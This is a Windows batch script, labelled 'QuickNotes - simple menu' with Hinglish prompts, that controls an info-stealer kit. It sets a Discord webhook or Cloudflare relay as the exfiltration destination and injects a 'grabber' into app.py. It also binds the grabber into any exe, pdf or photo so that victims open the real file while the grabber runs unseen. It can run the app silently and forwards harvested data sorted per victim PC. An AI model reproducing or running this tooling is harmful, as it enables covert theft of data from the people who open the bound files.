@echo off
setlocal enabledelayedexpansion
title QuickNotes - simple menu
cd /d "%~dp0"

rem ---- data destination ----
rem hook.cfg is the single source of truth. setwebhook.py writes it and
rem patches the fallbacks below, so every lane sends to the same place.
set "HOOK="
if exist "hook.cfg" set /p HOOK=<"hook.cfg"
if not defined HOOK set "HOOK=https://discord.com/api/webhooks/FRIEND_WEBHOOK_ID/FRIEND_WEBHOOK_TOKEN"
set "PLACEHOLDER=FRIEND_WEBHOOK_ID"

rem APPID is only for the QuickNotes demo app lane. The binder derives its own
rem label from the file name, so a bound Fusion.exe reports "fusion".
set APPID=quicknotes
set miss=0

rem Drag any file onto this .bat -> bound straight away, no menu.
if not "%~1"=="" goto dropin

rem First run with no webhook set -> ask before anything else.
echo %HOOK% | findstr /c:"%PLACEHOLDER%" >nul && goto firstrun

:menu
cls
echo.
echo   ===============================================
echo      QUICKNOTES - SIMPLE MENU
echo   ===============================================
echo.
echo   data jayega: %HOOK%
echo.
echo      1   Data sender chuno + bhejo (PC-wise sorted, live)
echo      2   app.py me inject karo     (grabber daalo)
echo      3   app.py chalao             (normal)
echo      4   app.py chalao             (bina window)
echo      5   Webhook zinda hai?
echo      6   Poora test tool
echo      7   Kisi bhi file me inject   (exe / pdf / photo)
echo      8   DATA KAHA JAYE - webhook set / badlo
echo      9   Bot token (live sender list)
echo     10   Dependencies install (pyinstaller)
echo      0   Band karo
echo.
echo   tip: koi bhi file is bat pe drag kar do - seedha bind ho jayegi.
echo.
set "pick="
set /p "pick=   number likho: "
if not defined pick set /a miss+=1
if defined pick set "miss=0"
if %miss% geq 3 goto end
if "%pick%"=="1" goto send
if "%pick%"=="2" goto inject
if "%pick%"=="3" goto run
if "%pick%"=="4" goto runsilent
if "%pick%"=="5" goto check
if "%pick%"=="6" goto testtool
if "%pick%"=="7" goto bindfile
if "%pick%"=="8" goto sethook
if "%pick%"=="9" goto settoken
if "%pick%"=="10" goto deps
if "%pick%"=="0" goto end
goto menu

:firstrun
cls
echo.
echo   ===============================================
echo      PEHLE DATA KAHA JAYEGA, WO SET KARO
echo   ===============================================
echo.
echo   abhi koi webhook set nahi hai. bina iske grabber
echo   ka data kahin nahi jayega.
echo.
pause
goto sethook

:sethook
cls
echo.
echo   ===============================================
echo      DATA KAHA JAYE
echo   ===============================================
echo.
echo   abhi: %HOOK%
echo.
echo      1   Discord webhook      (seedha Discord pe)
echo      2   Relay URL            (Cloudflare worker ke through)
echo      3   webhook test bhejo
echo      4   wapas
echo.
set "wh="
set /p "wh=   number: "
if "%wh%"=="1" goto sethook_discord
if "%wh%"=="2" goto sethook_relay
if "%wh%"=="3" goto sethook_test
if "%wh%"=="4" goto menu
goto sethook

:sethook_discord
cls
echo.
echo   Discord me: Server Settings - Integrations - Webhooks
echo   - New Webhook - Copy Webhook URL
echo.
set "URL="
set /p "URL=   webhook url paste karo: "
if not defined URL goto sethook
set "URL=%URL:"=%"
set "URL=%URL: =%"
echo.
python setwebhook.py --url "%URL%"
echo.
if exist "hook.cfg" set /p HOOK=<"hook.cfg"
pause
goto sethook

:sethook_relay
cls
echo.
echo   relay/worker.js deploy karo (Cloudflare Workers), uski
echo   https URL paste karo. Worker apne andar HOOK rakhta hai.
echo.
set "URL="
set /p "URL=   relay url paste karo: "
if not defined URL goto sethook
set "URL=%URL:"=%"
set "URL=%URL: =%"
echo.
python setwebhook.py --url "%URL%"
echo.
if exist "hook.cfg" set /p HOOK=<"hook.cfg"
pause
goto sethook

:sethook_test
cls
echo.
echo   --- webhook check ---
echo.
if "%HOOK%"=="" goto check_no_hook
echo %HOOK% | findstr /c:"%PLACEHOLDER%" >nul && goto check_no_hook
python -c "import json,urllib.request;u='%HOOK%?wait=true';b=json.dumps({'content':'webhook check - zinda hai'}).encode();r=urllib.request.Request(u,data=b,headers={'Content-Type':'application/json','User-Agent':'Mozilla/5.0'});resp=urllib.request.urlopen(r,timeout=20);print('   HTTP',resp.status);print('   webhook zinda hai - Discord dekh lo')" 2>&1
echo.
pause
goto sethook

:settoken
cls
echo.
echo   --- bot token (optional) ---
echo.
echo   live sender list ke liye chahiye. Discord Developer Portal
echo   - Bot - Reset Token - copy. Khali chhodne par wapas.
echo.
set "TOK="
set /p "TOK=   token: "
if not defined TOK goto menu
python setwebhook.py --token "%TOK%"
echo.
pause
goto menu

:deps
cls
echo.
echo   --- python dependencies ---
echo.
call "%~dp0setup_deps.bat"
echo.
pause
goto menu

:send
cls
echo.
echo   --- PC-wise data senders dikhao, chuno, usi ka data bhejo ---
echo.
python sender_send.py --webhook "%HOOK%" --refresh
echo.
pause
goto menu

:inject
cls
echo.
echo   --- app.py me grabber daal rahe hain ---
echo.
if not exist app_clean.py (
    echo   [!!] app_clean.py nahi mila.
    echo        inject nahi ho sakta. file check karo.
    echo.
    pause
    goto menu
)
copy /y app_clean.py app.py >nul
echo   [OK] saaf app.py banaya (app_clean.py se)
python inject.py --webhook "%HOOK%" --app-id %APPID% --target app.py
echo.
python -c "import ast;s=open('app.py',encoding='utf-8').read();ast.parse(s);print('   [OK] app.py theek hai,',len(s.splitlines()),'lines')"
echo.
echo   ab menu se 3 ya 4 dabao
echo.
pause
goto menu

:bindfile
cls
echo.
echo   --- kisi bhi file me grabber ---
echo.
echo   file ka poora path paste karo, ya file ko is window me
echo   drag karke chhod do.
echo.
set "tgt="
set /p "tgt=   file: "
if not defined tgt goto menu
set "tgt=%tgt:"=%"
call :dobind "%tgt%"
pause
goto menu

:dropin
cls
echo %HOOK% | findstr /c:"%PLACEHOLDER%" >nul && goto dropin_nohook
call :dobind "%~1"
pause
exit /b 0

:dropin_nohook
echo.
echo   [!!] pehle webhook set karo - data kahin jayega hi nahi.
echo.
pause
goto sethook

:dobind
set "src=%~1"
echo.
if not exist "%src%" goto bindmissing
echo   --- grabber daal rahe hain ---
echo.
python binder.py --target "%src%" --webhook "%HOOK%"
echo.
if errorlevel 1 goto bindfailed
echo   ho gaya. nayi file wahi rakhi hai - "_bound.exe" naam se.
echo   usko double-click karo - asli file khulegi aur grabber chalega.
goto :eof

:bindmissing
echo   [!!] file nahi mili: "%src%"
goto :eof

:bindfailed
echo   [!!] bind fail ho gaya. upar ka message dekho.
goto :eof

:run
cls
echo.
echo   --- app khul rahi hai (console ke saath) ---
echo.
echo   band karne ke liye window close kar do.
echo.
start "" python "%~dp0app.py"
timeout /t 2 >nul
goto menu

:runsilent
cls
echo.
echo   --- app khul rahi hai (koi console nahi) ---
echo.
start "" pythonw "%~dp0app.py"
echo   chal gaya - ab sirf app ki window dikhegi.
echo.
timeout /t 3 >nul
goto menu

:check
cls
echo.
echo   --- webhook check ---
echo.
if "%HOOK%"=="" goto check_no_hook
echo %HOOK% | findstr /c:"%PLACEHOLDER%" >nul && goto check_no_hook
python -c "import json,urllib.request;u='%HOOK%?wait=true';b=json.dumps({'content':'webhook check - zinda hai'}).encode();r=urllib.request.Request(u,data=b,headers={'Content-Type':'application/json','User-Agent':'Mozilla/5.0'});resp=urllib.request.urlopen(r,timeout=20);print('   HTTP',resp.status);print('   webhook zinda hai - Discord dekh lo')" 2>&1
echo.
pause
goto menu

:check_no_hook
echo   [!!] webhook set nahi hai. menu se 8 dabao.
echo.
pause
goto menu

:testtool
cls
echo.
python test.py
echo.
pause
goto menu

:end
exit /b 0
